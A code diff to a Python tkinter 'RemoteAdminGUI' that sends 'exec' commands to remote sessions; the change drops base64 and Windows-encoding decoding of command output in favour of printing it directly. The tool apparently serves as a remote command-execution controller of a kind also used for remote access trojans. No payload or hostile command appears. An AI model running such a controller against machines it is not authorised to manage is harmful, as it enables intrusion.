@@ -1,4 +1,3 @@
-import base64
 import threading
 import tkinter as tk
 from tkinter import ttk
@@ -159,41 +158,6 @@ class RemoteAdminGUI:
         """Executes a preset command on the active session."""
         self.send_command(preset_cmd=cmd_text)
 
-    def safe_b64decode(self, data_str):
-        """Safely decodes Base64 strings handling missing or broken padding."""
-        if isinstance(data_str, bytes):
-            data_str = data_str.decode("utf-8", errors="ignore")
-            
-        data_str = data_str.strip()
-        missing_padding = len(data_str) % 4
-        if missing_padding:
-            data_str += '=' * (4 - missing_padding)
-            
-        return base64.b64decode(data_str)
-
-    def decode_bytes_to_string(self, raw_bytes):
-        """Tries multiple Windows encodings to prevent garbled text."""
-        # 1. Try UTF-8
-        try:
-            return raw_bytes.decode("utf-8")
-        except UnicodeDecodeError:
-            pass
-
-        # 2. Try CP850 / CP437 (Standard Windows CMD in Western Europe)
-        try:
-            return raw_bytes.decode("cp850")
-        except UnicodeDecodeError:
-            pass
-
-        # 3. Try UTF-16 / Little-Endian (PowerShell output)
-        try:
-            return raw_bytes.decode("utf-16")
-        except UnicodeDecodeError:
-            pass
-
-        # 4. Fallback: Force UTF-8 replacing bad characters
-        return raw_bytes.decode("utf-8", errors="replace")
-
     def send_command(self, preset_cmd=None):
         session = self.selected_session()
         if not session:
@@ -213,12 +177,9 @@ class RemoteAdminGUI:
             try:
                 resp = session.command({"type": "exec", "cmd": cmd})
                 if resp and "data" in resp:
-                    try:
-                        decoded_bytes = self.safe_b64decode(resp["data"])
-                        readable_text = self.decode_bytes_to_string(decoded_bytes)
-                        self.log(f"[+] Output from Session {session.id}:\n{readable_text}")
-                    except Exception as dec_err:
-                        self.log(f"[-] Base64 decoding failed: {dec_err}")
+                    # Direct text rendering matching client.py output format
+                    output_data = resp["data"]
+                    self.log(f"[+] Output from Session {session.id}:\n{output_data}")
                 else:
                     self.log(f"[-] No valid response received from Session {session.id}")
             except Exception as e:
